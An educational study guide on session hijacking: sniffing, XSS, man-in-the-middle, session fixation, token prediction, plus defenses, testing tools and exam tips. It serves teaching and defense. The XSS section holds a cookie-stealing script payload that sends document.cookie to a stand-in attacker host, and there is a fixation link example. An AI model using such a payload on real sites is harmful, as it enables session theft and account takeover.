# Session Hijacking and Attacks

## Introduction to Session Management

In web applications, HTTP is a stateless protocol, meaning each request is independent and the server doesn't inherently remember previous interactions. To maintain user state across multiple requests, web applications use **sessions**. A session represents a series of interactions between a user and a web application over a period of time.

When a user authenticates successfully, the web server creates a session and assigns it a unique **session identifier (Session ID)**. This Session ID is then transmitted back to the client browser, typically via a cookie, and is included in subsequent requests to identify the user's session.

```
+----------------+       Login Request       +----------------+
|                | ------------------------> |                |
|    Client      |                           |    Server      |
|   (Browser)    | <------------------------ | (Web App)      |
|                |    Set-Cookie: SID=abc123 |                |
+----------------+                           +----------------+
         | Subsequent Requests with Cookie: SID=abc123
         | ------------------------------------------------>
         | <------------------------------------------------
```

## What is Session Hijacking?

**Session Hijacking** (also known as **Session Side-Jacking** or **Cookie Hijacking**) is an attack where an attacker illicitly takes over a valid user session by stealing or predicting the session token (typically a cookie). Once the attacker obtains the session ID, they can impersonate the legitimate user and gain unauthorized access to the user's account and privileges without needing their credentials.

The core of session hijacking lies in the principle: **Whoever possesses the session token is considered the authenticated user by the application.**

## How Session Hijacking Works

The general process of a session hijacking attack follows these steps:

1.  **User Authentication:** A legitimate user logs into a web application.
2.  **Session Creation:** The server creates a session and issues a session token (e.g., a cookie) to the user's browser.
3.  **Token Transmission:** The browser automatically includes this session token in all subsequent requests to the server.
4.  **Interception:** An attacker intercepts or steals this session token.
5.  **Impersonation:** The attacker uses the stolen token in their own requests to the server.
6.  **Session Takeover:** The server, recognizing the valid token, grants the attacker access to the user's session.

```
Legitimate User          Attacker           Web Server
     |                    |                    |
     |--- Login (creds)--->|                    |
     |<--Set-Cookie:SID---|                    |
     |--- Request (SID)--->|                    |
     |                    |--- Intercepts SID -|
     |                    |                    |
     |                    |--- Request (SID)--->|
     |                    |<--Access Granted---|
     |                    |                    |
```

## Common Session Hijacking Techniques

Attackers employ various methods to obtain valid session tokens.

### 1. Session Sniffing

This involves capturing network traffic to extract session cookies. It is most effective on unencrypted networks (HTTP instead of HTTPS).

- **Packet Sniffing:** Using tools like Wireshark or tcpdump to monitor traffic on a local network segment (e.g., public Wi-Fi). If the traffic is unencrypted, the session cookie is visible in plain text.
- **How it works:**
  ```
  Attacker on same Wi-Fi
         |
         | (Promiscuous Mode)
         V
  User <---> Router <---> Internet
         |
  Attacker sniffs all packets, extracts 'Cookie: SID=abc123' from HTTP headers.
  ```

### 2. Cross-Site Scripting (XSS)

XSS is a critical web vulnerability that can be exploited to hijack sessions. An attacker injects malicious client-side scripts into a vulnerable web page. When another user views the page, the script executes in their browser context.

- **Session Stealing via XSS:** A common payload is a script that sends the user's session cookie to a server controlled by the attacker.
  ```javascript
  // Malicious XSS payload
  <script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;</script>
  ```
- The attacker's server (`steal.php`) logs the cookie, and the attacker can then use it.

### 3. Man-in-the-Middle (MitM) Attacks

The attacker positions themself between the victim and the web server, intercepting all communication. This allows them to capture session tokens and even modify requests/responses.

- **Tools:** ARP spoofing can be used to facilitate MitM on a local network, followed by tools like Ettercap or Burp Suite to intercept traffic.
- **Defense:** HTTPS with properly validated certificates helps mitigate MitM attacks by encrypting traffic and authenticating the server.

### 4. Client-Side Attacks

This involves stealing session tokens directly from the user's computer.

- **Malware:** Keyloggers or trojans can be used to steal browser cookies or memory contents.
- **Browser Extensions:** Malicious extensions might have permission to read cookie data.
- **Local Access:** Physical access to a machine allows an attacker to copy browser cookie files (e.g., `Cookies` SQLite database in Chrome/Firefox).

### 5. Session Fixation

In a session fixation attack, the attacker tricks the user into using a session ID that the attacker already knows. Instead of stealing a token after login, the attacker sets the token _before_ login.

**Steps:**

1.  Attacker obtains a valid session ID (SID) from the web application (e.g., by visiting the site and receiving a cookie).
2.  Attacker forces the victim's browser to use this known SID. This can be done via a malicious link, XSS, or setting the cookie through a subdomain vulnerability.
    ```
    http://vulnerable-site.com/login.php?SID=attacker_known_id
    ```
3.  The victim logs in using the attacker's supplied SID.
4.  The server associates the authenticated session with the known SID.
5.  The attacker, who already knows the SID, can now access the authenticated session.

### 6. Brute-Force and Prediction

If the session tokens are not sufficiently random or complex, an attacker might be able to guess or brute-force valid tokens.

- **Prediction:** Analyzing patterns in how tokens are generated (e.g., based on time, username, incrementing numbers).
- **Brute-Force:** Systematically trying a large number of possible token values. This is only feasible if the token space is small.

## Session Token Security Properties

A secure session token should possess the following properties:

| Property          | Description                                                 | Example of Weak Implementation                               |
| :---------------- | :---------------------------------------------------------- | :----------------------------------------------------------- |
| **Length**        | Sufficiently long to resist brute-force attacks.            | A 16-bit token only has 65,536 possibilities.                |
| **Randomness**    | Unpredictable and statistically random.                     | Token generated from a predictable source, like a timestamp. |
| **Entropy**       | High measure of uncertainty.                                | Token based on a user's sequential user ID.                  |
| **Secure Flag**   | Cookie should only be sent over encrypted channels (HTTPS). | Cookie sent over HTTP, vulnerable to sniffing.               |
| **HttpOnly Flag** | Cookie should be inaccessible to JavaScript.                | Cookie readable by JavaScript, vulnerable to XSS.            |

## Defenses and Countermeasures

Preventing session hijacking requires a multi-layered approach addressing various vectors.

| Attack Vector           | Primary Defense                                      | Additional Measures                                     |
| :---------------------- | :--------------------------------------------------- | :------------------------------------------------------ |
| **Sniffing / MitM**     | **HTTPS everywhere** (encrypts traffic).             | Use HSTS (HTTP Strict Transport Security) header.       |
| **XSS**                 | **Input validation and output encoding.**            | Use Content Security Policy (CSP).                      |
| **Session Fixation**    | **Regenerate session ID** after successful login.    | Session management frameworks often do this by default. |
| **Brute-Force**         | Use **long, random session tokens** (e.g., 128-bit). | Implement session inactivity/timeout limits.            |
| **Client-Side Attacks** | **User education** on malware.                       | Secure device policies.                                 |

**Key Implementation Defenses:**

1.  **Use HTTPS Exclusively:** All communication, especially for authentication and subsequent requests, must be encrypted. Set the `Secure` flag on all cookies.
2.  **Set the HttpOnly Flag:** This makes cookies inaccessible to JavaScript, drastically reducing the impact of XSS attacks on session theft.
3.  **Implement Session Timeouts:** Sessions should expire after a period of inactivity (e.g., 15-30 minutes) and after an absolute duration (e.g., 8 hours).
4.  **Regenerate Session Tokens:** Issue a new session ID after login and at other privilege-changing events (e.g., password change) to prevent session fixation.
5.  **Validate User Agent and IP (Cautiously):** While not foolproof (as IPs can change dynamically), checking for consistency can add a layer of detection. However, this can cause false positives for legitimate users.

## Tools for Testing Session Security

- **Burp Suite:** The proxy, repeater, and intruder tools are essential for analyzing cookies, testing for fixation, and brute-forcing tokens.
- **OWASP ZAP (Zed Attack Proxy):** Similar to Burp Suite, it can intercept traffic, scan for vulnerabilities like XSS, and test session management.
- **Browser Developer Tools:** Built-in tools (F12) to inspect cookies, check flags (`HttpOnly`, `Secure`), and monitor network requests.
- **Wireshark:** For packet-level analysis to see if cookies are transmitted in cleartext.

## Exam Tips

- **Remember the Principle:** The fundamental concept is "possession of the token equals authentication." No credentials are needed post-hijack.
- **Differentiate Techniques:** Be clear on the difference between _sniffing_ (passive interception), _XSS_ (active injection), and _fixation_ (pre-login token assignment).
- **Flags are Key:** The `Secure` and `HttpOnly` cookie flags are critical, simple defenses. Know what they do and why they are used.
- **HTTPS is Non-Negotiable:** It is the primary defense against sniffing and MitM attacks. An application using HTTP for sensitive actions is inherently vulnerable.
- **Think Like a Tester:** For exam scenarios, consider how you would test for these vulnerabilities using tools like Burp Suite (e.g., intercept a request, check the cookie, remove the `HttpOnly` flag, try to access it via XSS).
